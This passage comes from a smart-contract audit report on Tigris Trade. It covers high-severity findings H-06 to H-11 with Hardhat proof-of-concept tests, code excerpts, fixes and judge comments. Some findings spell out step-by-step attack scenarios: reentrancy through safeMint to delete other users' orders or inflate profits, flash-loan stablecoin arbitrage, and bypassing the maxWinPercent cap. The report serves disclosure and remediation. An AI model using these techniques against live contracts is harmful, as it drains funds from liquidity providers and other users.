diff--gita/contracts/BondNFT.solb/contracts/BondNFT.solindex33a6e76..77e85ae100644---a/contracts/BondNFT.sol+++b/contracts/BondNFT.sol@@ -148,7+148,7@@contractBondNFTisERC721Enumerable,Ownable{amount=bond.amount;unchecked{totalShares[bond.asset] -=bond.shares;-            (uint256_claimAmount,) =claim(_id,bond.owner);+            (uint256_claimAmount,) =_claim(_id,bond.owner);amount+=_claimAmount;}asset=bond.asset;@@ -157,8+157,9@@contractBondNFTisERC721Enumerable,Ownable{_burn(_id);emitRelease(asset,lockAmount,_owner,_id);}+/**-     *@noticeClaim rewards from a bond+     *@noticeClaim rewards from an unexpired bond*@devShould only be called by a manager contract*@param_idID of the bond to claim rewards from*@param_claimeraddress claiming rewards@@ -168,6 +169,22 @@ contract BondNFT is ERC721Enumerable, Ownable {function claim(uint _id,address _claimer+    ) public onlyManager() returns(uint amount, address tigAsset) {+        Bond memory bond = idToBond(_id);+        require(!bond.expired, "expired");+        return _claim(_id, _claimer);+    }++    /**+     *@noticeClaim rewards from a releasing bond or an unexpired bond+     *@param_idID of the bond to claim rewards from+     *@param_claimeraddress claiming rewards+     *@returnamount amount of tigAsset claimed+     *@returntigAsset tigAsset token address+     */+function_claim(+uint_id,+address_claimer)publiconlyManager()returns(uintamount,addresstigAsset) {Bondmemorybond=idToBond(_id);require(_claimer==bond.owner,"!owner");
TriHaz (Tigris Trade) confirmed
Alex the Entreprenerd (judge) commented:
The warden has shown how, due to an inconsistent implementation of Bond State change, how they could repeatedly claim rewards for an expired bond, stealing value from all other depositors.Because the findings doesn’t just deny yield to others, but allows a single attacker to seize the majority of the yield rewards, leveraging a broken invariant, I agree with High Severity.
GainsGoblin (Tigris Trade) resolved:
Mitigation:https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419174442

[H-06] Incorrect calculation of new price while adding position
Submitted byKingNFT
The formula used for calculating_newPriceinaddToPosition()function of Trading.sol is not correct, users will lose part of their funds/profit while using this function.
The wrong formula
uint _newPrice = _trade.price*_trade.margin/_newMargin + _price*_addMargin/_newMargin;
The correct formula is
uint _newPrice = _trade.price * _price * _newMargin /  (_trade.margin * _price + _addMargin * _trade.price);
Why this works?
Given
P1 = _trade.priceP2 = _priceP = _newPriceM1 = _trade.marginM2 = _addMarginM =  M1 + M2 = _newMarginL = _trade.leverageU1 = M1 * L  = old position in USDU2 = M2 * L = new position in USDU = U1 + U2 = total position in USDE1 = U1 / P1 = old position of base asset, such as ETH, of the pairE2 = U2 / P2 = new position of base asset of the pairE = E1 + E2 = total position of base asset of the pair
Then
P = U / E= (U1 + U2) / (E1 + E2)= (M1 * L + M2 * L) / (U1 / P1 + U2 / P2)= P1 * P2 * (M1 * L + M2 * L) / (U1 * P2 + U2 * P1)= P1 * P2 * (M1 + M2) * L / (M1 * L * P2 + M2 * L * P1)= P1 * P2 * (M1 + M2) * L / [(M1 * P2 + M2 * P1) * L]= P1 * P2 * M / (M1 * P2 + M2 * P1)
proven.
Proof of Concept
The following test case shows two examples that users lose some funds due to adding a new position whenever their existing position is in profit or loss state.
const { expect } = require("chai");const { deployments, ethers, waffle } = require("hardhat");const { parseEther, formatEther } = ethers.utils;const { signERC2612Permit } = require('eth-permit');const exp = require("constants");describe("Incorrect calculation of new margin price while adding position", function () {let owner;let node;let user;let node2;let node3;let proxy;let Trading;let trading;let TradingExtension;let tradingExtension;let TradingLibrary;let tradinglibrary;let StableToken;let stabletoken;let StableVault;let stablevault;let position;let pairscontract;let referrals;let permitSig;let permitSigUsdc;let MockDAI;let mockdai;let MockUSDC;let mockusdc;let badstablevault;let chainlink;beforeEach(async function () {await deployments.fixture(['test']);[owner, node, user, node2, node3, proxy] = await ethers.getSigners();StableToken = await deployments.get("StableToken");stabletoken = await ethers.getContractAt("StableToken", StableToken.address);Trading = await deployments.get("Trading");trading = await ethers.getContractAt("Trading", Trading.address);await trading.connect(owner).setMaxWinPercent(5e10);TradingExtension = await deployments.get("TradingExtension");tradingExtension = await ethers.getContractAt("TradingExtension", TradingExtension.address);const Position = await deployments.get("Position");position = await ethers.getContractAt("Position", Position.address);MockDAI = await deployments.get("MockDAI");mockdai = await ethers.getContractAt("MockERC20", MockDAI.address);MockUSDC = await deployments.get("MockUSDC");mockusdc = await ethers.getContractAt("MockERC20", MockUSDC.address);const PairsContract = await deployments.get("PairsContract");pairscontract = await ethers.getContractAt("PairsContract", PairsContract.address);const Referrals = await deployments.get("Referrals");referrals = await ethers.getContractAt("Referrals", Referrals.address);StableVault = await deployments.get("StableVault");stablevault = await ethers.getContractAt("StableVault", StableVault.address);await stablevault.connect(owner).listToken(MockDAI.address);await stablevault.connect(owner).listToken(MockUSDC.address);await tradingExtension.connect(owner).setAllowedMargin(StableToken.address, true);await tradingExtension.connect(owner).setMinPositionSize(StableToken.address, parseEther("1"));await tradingExtension.connect(owner).setNode(node.address, true);await tradingExtension.connect(owner).setNode(node2.address, true);await tradingExtension.connect(owner).setNode(node3.address, true);await network.provider.send("evm_setNextBlockTimestamp", [2000000000]);await network.provider.send("evm_mine");permitSig = await signERC2612Permit(owner, MockDAI.address, owner.address, Trading.address, ethers.constants.MaxUint256);permitSigUsdc = await signERC2612Permit(owner, MockUSDC.address, owner.address, Trading.address, ethers.constants.MaxUint256);const BadStableVault = await ethers.getContractFactory("BadStableVault");badstablevault = await BadStableVault.deploy(StableToken.address);const ChainlinkContract = await ethers.getContractFactory("MockChainlinkFeed");chainlink = await ChainlinkContract.deploy();TradingLibrary = await deployments.get("TradingLibrary");tradinglibrary = await ethers.getContractAt("TradingLibrary", TradingLibrary.address);await trading.connect(owner).setLimitOrderPriceRange(1e10);});describe("Initial margin $500, leverage 2x, position $1000, price $1000", function () {let orderId;let initPrice = parseEther("1000");beforeEach(async function () {// To simpliy the problem, set fees to 0await trading.setFees(true, 0, 0, 0, 0, 0);await trading.setFees(false, 0, 0, 0, 0, 0);let TradeInfo = [parseEther("500"), MockDAI.address, StableVault.address, parseEther("2"), 1, true, parseEther("0"), parseEther("0"), ethers.constants.HashZero];let PriceData = [node.address, 1, initPrice, 0, 2000000000, false];let message = ethers.utils.keccak256(ethers.utils.defaultAbiCoder.encode(['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],[node.address, 1, initPrice, 0, 2000000000, false]));let sig = await node.signMessage(Buffer.from(message.substring(2), 'hex'));let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];orderId = await position.getCount();await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);expect(await position.assetOpenPositionsLength(1)).to.equal(1);let trade = await position.trades(orderId);let marginAfterFee = trade.margin;expect(marginAfterFee.eq(parseEther('500'))).to.equal(true);expect(trade.price.eq(parseEther('1000'))).to.be.true;expect(trade.leverage.eq(parseEther('2'))).to.be.true;});it.only("Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1666", async function () {// The price increases from $1000 to $2000, the old position earns $1000 profit.// The expected PnL payout = old margin + earned profit + new margin//                         = $500 + $1000 + $500//                         = $2000let addingPrice = parseEther('2000');let addingPriceData = [node.address, 1, addingPrice, 0, 2000000000, false];let addingMessage = ethers.utils.keccak256(ethers.utils.defaultAbiCoder.encode(['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],[node.address, 1, addingPrice, 0, 2000000000, false]));let addingSig = await node.signMessage(Buffer.from(addingMessage.substring(2), 'hex'));let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];await trading.connect(owner).addToPosition(orderId, parseEther('500'), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);let trade = await position.trades(orderId);let pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,trade.margin, trade.leverage, trade.accInterest);expect(pnl._payout.gt(parseEther('1666'))).to.be.true;expect(pnl._payout.lt(parseEther('1667'))).to.be.true;});it.only("Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $714", async function () {// The price decreases from $1000 to $750, the old position losses $250.// The expected PnL payout = old margin - loss + new margin//                         = $500 - $250 + $500//                         = $750let addingPrice = parseEther('750');let addingPriceData = [node.address, 1, addingPrice, 0, 2000000000, false];let addingMessage = ethers.utils.keccak256(ethers.utils.defaultAbiCoder.encode(['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],[node.address, 1, addingPrice, 0, 2000000000, false]));let addingSig = await node.signMessage(Buffer.from(addingMessage.substring(2), 'hex'));let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];await trading.connect(owner).addToPosition(orderId, parseEther('500'), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);let trade = await position.trades(orderId);let pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,trade.margin, trade.leverage, trade.accInterest);expect(pnl._payout.gt(parseEther('714'))).to.be.true;expect(pnl._payout.lt(parseEther('715'))).to.be.true;});});});
The test result
Incorrect calculation of new margin price while adding positionInitial margin $500, leverage 2x, position $1000, price $1000√ Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1666√ Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $714
Tools Used
Hardhat
Recommended Mitigation Steps
Use the correct formula, the following test case is for the same above examples after fix.
const { expect } = require("chai");const { deployments, ethers, waffle } = require("hardhat");const { parseEther, formatEther } = ethers.utils;const { signERC2612Permit } = require('eth-permit');const exp = require("constants");describe("Correct calculation of new margin price while adding position", function () {let owner;let node;let user;let node2;let node3;let proxy;let Trading;let trading;let TradingExtension;let tradingExtension;let TradingLibrary;let tradinglibrary;let StableToken;let stabletoken;let StableVault;let stablevault;let position;let pairscontract;let referrals;let permitSig;let permitSigUsdc;let MockDAI;let mockdai;let MockUSDC;let mockusdc;let badstablevault;let chainlink;beforeEach(async function () {await deployments.fixture(['test']);[owner, node, user, node2, node3, proxy] = await ethers.getSigners();StableToken = await deployments.get("StableToken");stabletoken = await ethers.getContractAt("StableToken", StableToken.address);Trading = await deployments.get("Trading");trading = await ethers.getContractAt("Trading", Trading.address);await trading.connect(owner).setMaxWinPercent(5e10);TradingExtension = await deployments.get("TradingExtension");tradingExtension = await ethers.getContractAt("TradingExtension", TradingExtension.address);const Position = await deployments.get("Position");position = await ethers.getContractAt("Position", Position.address);MockDAI = await deployments.get("MockDAI");mockdai = await ethers.getContractAt("MockERC20", MockDAI.address);MockUSDC = await deployments.get("MockUSDC");mockusdc = await ethers.getContractAt("MockERC20", MockUSDC.address);const PairsContract = await deployments.get("PairsContract");pairscontract = await ethers.getContractAt("PairsContract", PairsContract.address);const Referrals = await deployments.get("Referrals");referrals = await ethers.getContractAt("Referrals", Referrals.address);StableVault = await deployments.get("StableVault");stablevault = await ethers.getContractAt("StableVault", StableVault.address);await stablevault.connect(owner).listToken(MockDAI.address);await stablevault.connect(owner).listToken(MockUSDC.address);await tradingExtension.connect(owner).setAllowedMargin(StableToken.address, true);await tradingExtension.connect(owner).setMinPositionSize(StableToken.address, parseEther("1"));await tradingExtension.connect(owner).setNode(node.address, true);await tradingExtension.connect(owner).setNode(node2.address, true);await tradingExtension.connect(owner).setNode(node3.address, true);await network.provider.send("evm_setNextBlockTimestamp", [2000000000]);await network.provider.send("evm_mine");permitSig = await signERC2612Permit(owner, MockDAI.address, owner.address, Trading.address, ethers.constants.MaxUint256);permitSigUsdc = await signERC2612Permit(owner, MockUSDC.address, owner.address, Trading.address, ethers.constants.MaxUint256);const BadStableVault = await ethers.getContractFactory("BadStableVault");badstablevault = await BadStableVault.deploy(StableToken.address);const ChainlinkContract = await ethers.getContractFactory("MockChainlinkFeed");chainlink = await ChainlinkContract.deploy();TradingLibrary = await deployments.get("TradingLibrary");tradinglibrary = await ethers.getContractAt("TradingLibrary", TradingLibrary.address);await trading.connect(owner).setLimitOrderPriceRange(1e10);});describe("Initial margin $500, leverage 2x, position $1000, price $1000", function () {let orderId;let initPrice = parseEther("1000");beforeEach(async function () {// To simpliy the problem, set fees to 0await trading.setFees(true, 0, 0, 0, 0, 0);await trading.setFees(false, 0, 0, 0, 0, 0);let TradeInfo = [parseEther("500"), MockDAI.address, StableVault.address, parseEther("2"), 1, true, parseEther("0"), parseEther("0"), ethers.constants.HashZero];let PriceData = [node.address, 1, initPrice, 0, 2000000000, false];let message = ethers.utils.keccak256(ethers.utils.defaultAbiCoder.encode(['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],[node.address, 1, initPrice, 0, 2000000000, false]));let sig = await node.signMessage(Buffer.from(message.substring(2), 'hex'));let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];orderId = await position.getCount();await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);expect(await position.assetOpenPositionsLength(1)).to.equal(1);let trade = await position.trades(orderId);let marginAfterFee = trade.margin;expect(marginAfterFee.eq(parseEther('500'))).to.equal(true);expect(trade.price.eq(parseEther('1000'))).to.be.true;expect(trade.leverage.eq(parseEther('2'))).to.be.true;});it.only("Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1999.99999", async function () {// The price increases from $1000 to $2000, the old position earns $1000 profit.// The expected PnL payout = old margin + earned profit + new margin//                         = $500 + $1000 + $500//                         = $2000let addingPrice = parseEther('2000');let addingPriceData = [node.address, 1, addingPrice, 0, 2000000000, false];let addingMessage = ethers.utils.keccak256(ethers.utils.defaultAbiCoder.encode(['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],[node.address, 1, addingPrice, 0, 2000000000, false]));let addingSig = await node.signMessage(Buffer.from(addingMessage.substring(2), 'hex'));let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];await trading.connect(owner).addToPosition(orderId, parseEther('500'), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);let trade = await position.trades(orderId);let pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,trade.margin, trade.leverage, trade.accInterest);expect(pnl._payout.gt(parseEther('1999.99999'))).to.be.true;expect(pnl._payout.lt(parseEther('2000'))).to.be.true;});it.only("Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $749.99999", async function () {// The price decreases from $1000 to $750, the old position losses $250.// The expected PnL payout = old margin - loss + new margin//                         = $500 - $250 + $500//                         = $750let addingPrice = parseEther('750');let addingPriceData = [node.address, 1, addingPrice, 0, 2000000000, false];let addingMessage = ethers.utils.keccak256(ethers.utils.defaultAbiCoder.encode(['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],[node.address, 1, addingPrice, 0, 2000000000, false]));let addingSig = await node.signMessage(Buffer.from(addingMessage.substring(2), 'hex'));let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];await trading.connect(owner).addToPosition(orderId, parseEther('500'), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);let trade = await position.trades(orderId);let pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,trade.margin, trade.leverage, trade.accInterest);expect(pnl._payout.gt(parseEther('749.99999'))).to.be.true;expect(pnl._payout.lt(parseEther('750'))).to.be.true;});});});
The test result
Correct calculation of new margin price while adding positionInitial margin $500, leverage 2x, position $1000, price $1000√ Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1999.99999√ Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $749.99999
TriHaz (Tigris Trade) confirmed
Alex the Entreprenerd (judge) commented:
The warden has shown how, usingaddToPositioncan cause the payout math to become incorrect, because this highlights an issue with the math of the protocol, which will impact its functionality, I believe High Severity to be appropriate.
GainsGoblin (Tigris Trade) resolved:
Mitigation:https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419174986

[H-07] reentrancy attack duringmint()function in Position contract which can lead to removing of the other user’s limit orders or stealing contract funds because initId is set low value
Submitted byunforgiven, also found bywait,rotcivegaf,0xsomeone,hihen,KingNFT,mookimgo,debo, andstealthyz
FunctionPosition.mint()has been used ininitiateLimitOrder()andinitiateMarketOrder()and it doesn’t follow check-effect-interaction pattern and code updates the values of_limitOrders,initId,_openPositionsandposition _tokenIdsvariables after making external call by usingsafeMint(). This would give the attacker opportunity to reenter the Trading contract logics and perform malicious actions while the contract storage state is wrong. The only limitation of the attacker is that he needs to bypass_checkDelay()checks. Attacker can perform this action:
CallinitiateLimitOrder()and create limit order with id equal to ID1 reenter (while_limitOrdersfor ID1 is not yet settled) withcancelLimitOrder(ID1)(nocheckDelay()check) and remove other users limit orders because code would try to remove_limitOrderIndexes[_asset][ID1]position but the value is 0 and code would remove limit order in the index 0 which belongs to another user in thePosition.burn()code.CallinitiateMarketOrder()and create a position with ID1 and whileinitId[ID1]has not yet settled reenter the Trading withaddToPosition(ID1)function (bypasscheckDelay()because both action is opening) and increase the position size which would setinitId[ID1]according to new position values but then when code execution returns to rest ofmint()logicinitId[ID1]would set by initial values of the positions which is very lower than what it should be andinitId[ID1]has been used for calculatingaccuredInterestof the position which is calculated for profit and loss of position and contract would calculate more profit for position and would pay attacker more profit from contract balances.
Proof of Concept
This ismint()code in Position contract:
function mint(MintTrade memory _mintTrade) external onlyMinter {uint newTokenID = _tokenIds.current();Trade storage newTrade = _trades[newTokenID];newTrade.margin = _mintTrade.margin;newTrade.leverage = _mintTrade.leverage;newTrade.asset = _mintTrade.asset;newTrade.direction = _mintTrade.direction;newTrade.price = _mintTrade.price;newTrade.tpPrice = _mintTrade.tp;newTrade.slPrice = _mintTrade.sl;newTrade.orderType = _mintTrade.orderType;newTrade.id = newTokenID;newTrade.tigAsset = _mintTrade.tigAsset;_safeMint(_mintTrade.account, newTokenID);   // make external call because of safeMint() usageif (_mintTrade.orderType > 0) { // update the values of some storage functions_limitOrders[_mintTrade.asset].push(newTokenID);_limitOrderIndexes[_mintTrade.asset][newTokenID] = _limitOrders[_mintTrade.asset].length-1;} else {initId[newTokenID] = accInterestPerOi[_mintTrade.asset][_mintTrade.tigAsset][_mintTrade.direction]*int256(_mintTrade.margin*_mintTrade.leverage/1e18)/1e18;_openPositions.push(newTokenID);_openPositionsIndexes[newTokenID] = _openPositions.length-1;_assetOpenPositions[_mintTrade.asset].push(newTokenID);_assetOpenPositionsIndexes[_mintTrade.asset][newTokenID] = _assetOpenPositions[_mintTrade.asset].length-1;}_tokenIds.increment();}
As you can see by calling_safeMint(), code would make external call toonERC721Received()function of the account address and the code sets the values for_limitOrders[],_limitOrderIndexes[],initId[],_openPositions[],_openPositionsIndexes[],_assetOpenPositions[],_assetOpenPositionsIndexes[]and_tokenIds. So code doesn’t follow check-effect-interaction pattern and it’s possible to perform reentrancy attack.
There could be multiple scenarios that the attacker can perform the attack and do some damage. Two of them are:
Scenario #1 where attacker removes other users limit orders and create broken storage state
Attacker contract would callinitiateLimitOrder()and code would create the limit order and mint it in thePosition._safeMint()with ID1.Then code would call attacker address in_safeMint()function because of theonERC721Received()call check.Variables_limitOrders[],_limitOrderIndexes[ID1]are not yet updated for ID1 and_limitOrderIndexes[ID1]is 0x0 and ID1 is not in_limitOrder[]list.Attacker contract would reenter the Trading contract by callingcancelLimitOrder(ID1).cancelLimitOrder()checks would pass and would try to callPosition.burn(ID1).burn()function would try to remove ID1 from_limitOrders[]list but because_limitOrderIndexes[ID1]is 0, the code would remove the 0 index limit order which belongs to another user.Execution would return toPosition.mint()logic and code would add burned id token to_limitOrder[]list.
So there are two impacts here.  First, other users limit orders get removed.  The second is that contract storage had a bad state and burned tokens get stock in the list.
Scenario #2 where attacker steal contract/users funds by wrong profit calculation
Attacker’s contract would callinitiateMarketOrder(lowMargin)to create position with ID1 while the margin is low.Code would mint position token for attacker and in_safeMint()would make external call and callonERC721Received()function of attacker address.The value ofinitId[ID1]is not yet set for ID1.Attacker contract would calladdToPosition(ID1, bigMargin)to increase the margin of the position the_checkDelay()check would pass because both actions are opening position.Code would increase the margin of the position and set the value of theinitId[ID1]by callingposition.addToPosition()and the value would be based on thenewMargin.The execution flow would receive the rest ofPosition.mint()function and code would setinitId[ID1]based on old margin value.Then the value ofinitId[ID1]for attacker position would be very low, which would causeaccInterestto be higher than it’s supposed to be for position(inPosition.trades()function calculations ) and would cause_payoutvalue to be very high (inpnl()function’s calculations) and when attacker close position ID1 attacker would receive a lot more profit from it.
So attacker created a position with a lot of profit by reentering the logics and manipulating calculation of the profits for the position.
There can be other scenarios possible to perform and damage the protocol or users because there is no reentrancy protection mechanism and attacker only need to bypass validity checks of functions.
Tools Used
VIM
Recommended Mitigation Steps
Follow the check-effect-interaction pattern.
TriHaz (Tigris Trade) confirmed
Alex the Entreprenerd (judge) commented:
In contrast to other CEI reports, this report shows how control can be gained in the middle of the mint execution to create an inconsistent state.The warden has shown how, becausemintdoesn’t follow CEI conventions, by reEntering via safeMint, an attacker can manipulate the state of limit orders, and also benefit by changing profit calculations.Because the finding shows how to break invariants and profit from it, I agree with High Severity.
GainsGoblin (Tigris Trade) resolved:
Mitigation:https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419175911

[H-08] Incorrect Assumption of Stablecoin Market Stability
Submitted by0xsomeone, also found byCritical,__141345__,Tointer,Secureverse,SamGMK,rotcivegaf,0xhacksmithh,8olidity,Ruhum, andaviggiano
https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableVault.sol#L39-L51
https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableVault.sol#L60-L72
Impact
TheStableVaultcontract attempts to group all types of stablecoins under a single token which can be minted for any of the stablecoins supported by the system as well as burned for any of them.
This is at minimum a medium-severity vulnerability as the balance sheet of theStableVaultwill consist of multiple assets which do not have a one-to-one exchange ratio between them as can be observed by trading pools such asCurveas well as theChainlink oracle reported prices themselves.
Given that the contract exposes a 0% slippage 1-to-1 exchange between assets that in reality have varying prices, the balance sheet of the contract can be arbitraged (especially by flash-loans) to swap an undesirable asset (i.e. USDC which at the time of submission was valued at0.99994853USD) for a more desirable asset (i.e. USDT which at the time of submission was valued at1.00000000USD) acquiring an arbitrage in the price by selling the traded asset.
Proof of Concept
To illustrate the issue, simply view the exchange output you would get for swapping your USDC to USDT in a stablecoin pool (i.e. CurveFi) and then proceed toinvokedepositwith your USDC asset and retrieve yourincorrectly calculatedUSDTequivalent viawithdraw.
The arbitrage can be observed by assessing the difference in the trade outputs and can be capitalized by selling our newly acquiredUSDTforUSDCon the stablecoin pair we assessed earlier, ultimately ending up with a greater amount ofUSDCthan we started with. This type of attack can be extrapolated by utilizing a flash-loan rather than our personal funds.
Tools Used
Chainlink oracle resources
Curve Finance pools
Recommended Mitigation Steps
We advise theStableVaultto utilize Chainlink oracles for evaluating the inflow of assets instead, ensuring that all inflows and outflows of stablecoins are fairly evaluated based on their “neutral” USD price rather than their subjective on-chain price or equality assumption.
Alex the Entreprenerd (judge) increased severity to High and commented:
The warden has shown how, due to an incorrect assumption, the system offers infinite leverage.This can be trivially exploited by arbitraging with any already available exchange.Depositors will incur a loss equal to the size of the arbitrage as the contract is always taking the losing side.I believe this should be High because of it’s consistently losing nature.
TriHaz (Tigris Trade) acknowledged and commented:
We are aware of this issue, we will keep the vault with one token for now.

[H-09] Users can bypass themaxWinPercentlimit using a partially closing
Submitted byhansfriese, also found by0x52,0xA5DF, andbin2chen
Users can bypass themaxWinPercentlimit using a partial closing.
As a result, users can receive more funds than their upper limit from the protocol.
Proof of Concept
As we can see from thedocumentation, there is limitation of a maximum PnL.
Maximum PnL is +500%. The trade won't be closed unless the user sets a Take Profit order or closes the position manually.
And this logic was implemented like below in_closePosition().
File:2022-12-tigris\contracts\Trading.sol624:_toMint=_handleCloseFees(_trade.asset,uint256(_payout)*_percent/DIVISION_CONSTANT,_trade.tigAsset,_positionSize*_percent/DIVISION_CONSTANT,_trade.trader,_isBot);625:if(maxWinPercent>0&&_toMint>_trade.margin*maxWinPercent/DIVISION_CONSTANT) {//@audit bypass limit626:_toMint=_trade.margin*maxWinPercent/DIVISION_CONSTANT;627:                 }
But it checks themaxWinPercentbetween the partial payout and full margin so the below scenario is possible.
Alice opened an order of margin = 100 and PnL = 1000 after taking closing fees.IfmaxWinPercent= 500%, Alice should receive 500 at most.But Alice closed 50% of the position and she got 500 for a 50% margin because it checksmaxWinPercentwith_toMint = 500and_trade.margin = 100After she closed 50% of the position, the remaining margin = 50 and PnL = 500 so she can continue step 3 again and again.As a result, she can withdraw almost 100% of the initial PnL(1000) even though she should receive at most 500.
Recommended Mitigation Steps
We should check themaxWinPercentbetween the partial payout and partial margin like below.
_toMint=_handleCloseFees(_trade.asset,uint256(_payout)*_percent/DIVISION_CONSTANT,_trade.tigAsset,_positionSize*_percent/DIVISION_CONSTANT,_trade.trader,_isBot);uint256partialMarginToClose=_trade.margin*_percent/DIVISION_CONSTANT;//+++++++++++++++++++++++if(maxWinPercent>0&&_toMint>partialMarginToClose*maxWinPercent/DIVISION_CONSTANT) {_toMint=partialMarginToClose*maxWinPercent/DIVISION_CONSTANT;}
TriHaz (Tigris Trade) confirmed, but disagreed with severity and commented:
I would label this as Medium risk as a +500% win is required so assets are not in a direct risk.
Alex the Entreprenerd (judge) commented:
The Warden has shown how, by partially closing an order, it is possible to bypass themaxWinPercentcap.Per similar discussion to#111the fact that not every trade can be above 500% in payout is not a guarantee that some trade will be, and those that will, will cause the invariant to be broken and LPs to be deeper in the red than they should.Because this causes an immediate gain to the attacker, at a loss for LPs, I agree with High Severity.
GainsGoblin (Tigris Trade) resolved:
Mitigation:https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419176771

[H-10] User can abuse tight stop losses and high leverage to make risk free trades
Submitted by0x52, also found byhansfrieseandnoot
User can abuse how stop losses are priced to open high leverage trades with huge upside and very little downside.
Proof of Concept
function limitClose(uint _id,bool _tp,PriceData calldata _priceData,bytes calldata _signature)external{_checkDelay(_id, false);(uint _limitPrice, address _tigAsset) = tradingExtension._limitClose(_id, _tp, _priceData, _signature);_closePosition(_id, DIVISION_CONSTANT, _limitPrice, address(0), _tigAsset, true);}function _limitClose(uint _id,bool _tp,PriceData calldata _priceData,bytes calldata _signature) external view returns(uint _limitPrice, address _tigAsset) {_checkGas();IPosition.Trade memory _trade = position.trades(_id);_tigAsset = _trade.tigAsset;getVerifiedPrice(_trade.asset, _priceData, _signature, 0);uint256 _price = _priceData.price;if (_trade.orderType != 0) revert("4"); //IsLimitif (_tp) {if (_trade.tpPrice == 0) revert("7"); //LimitNotSetif (_trade.direction) {if (_trade.tpPrice > _price) revert("6"); //LimitNotMet} else {if (_trade.tpPrice < _price) revert("6"); //LimitNotMet}_limitPrice = _trade.tpPrice;} else {if (_trade.slPrice == 0) revert("7"); //LimitNotSetif (_trade.direction) {if (_trade.slPrice < _price) revert("6"); //LimitNotMet} else {if (_trade.slPrice > _price) revert("6"); //LimitNotMet}//@audit stop loss is closed at user specified price NOT market price_limitPrice = _trade.slPrice;}}
When closing a position with a stop loss the user is closed at their SL price rather than the current price of the asset. A user could abuse this in directional markets with high leverage to make nearly risk free trades. A user could open a long with a stop loss that in $0.01 below the current price. If the price tanks immediately on the next update then they will be closed out at their entrance price, only out the fees to open and close their position. If the price goes up then they can make a large gain.
Recommended Mitigation Steps
Take profit and stop loss trades should be executed at the current price rather than the price specified by the user:
if (_trade.tpPrice == 0) revert("7"); //LimitNotSetif (_trade.direction) {if (_trade.tpPrice > _price) revert("6"); //LimitNotMet} else {if (_trade.tpPrice < _price) revert("6"); //LimitNotMet}-       _limitPrice = _trade.tpPrice;+       _limitPrice = _price;} else {if (_trade.slPrice == 0) revert("7"); //LimitNotSetif (_trade.direction) {if (_trade.slPrice < _price) revert("6"); //LimitNotMet} else {if (_trade.slPrice > _price) revert("6"); //LimitNotMet}-       _limitPrice = _trade.slPrice;+       _limitPrice = _price;
TriHaz (Tigris Trade) disputed and commented:
Because of open fees, close fees and spread, that wouldn’t be profitable.We also have a cooldown after a trade is opened so there will be enough time for price to move freely past the sl.
Alex the Entreprenerd (judge) commented:
The warden has shown a flaw in how the protocol offers Stop Losses.By using the originally stored value for Stop Loss, instead of just using it as a trigger, an attacker can perform a highly profitable strategy on the system as they know that their max risk is capped by the value of the Stop Loss, instead of the current asset price.This will happen at the detriment of LPs.Because the attack breaks an important invariant, causing a loss to other users, I agree with High Severity.

[H-11] Not enough margin pulled or burned from user when adding to a position
Submitted byminhtrng, also found byAymen0909,hansfriese,0Kage,Jeiwan,bin2chen,KingNFT,HollaDieWaldfee, andrvierdiiev
When adding to a position, the amount of margin pulled from the user is not as much as it should be, which leaks value from the protocol, lowering the collateralization ratio oftigAsset.
Proof of Concept
InTrading.addToPositionthe_handleDepositfunction is called like this:
_handleDeposit(_trade.tigAsset,_marginAsset,_addMargin-_fee,_stableVault,_permitData,_trader);
The third parameter with the value of_addMargin - _feeis the amount pulled (or burned in the case of usingtigAsset) from the user. The_feevalue is calculated as part of the position size like this:
uint_fee=_handleOpenFees(_trade.asset,_addMargin*_trade.leverage/1e18,_trader,_trade.tigAsset,false);
The_handleOpenFeesfunction mints_tigAssetto the referrer, to themsg.sender(if called by a function meant to be executed by bots) and to the protocol itself. Those minted tokens are supposed to be part of the_addMarginvalue paid by the user. Hence using_addMargin - _feeas the third parameter to_handleDepositis going to pull or burn less margin than what was accounted for.
An example for correct usage can be seen ininitiateMarketOrder:
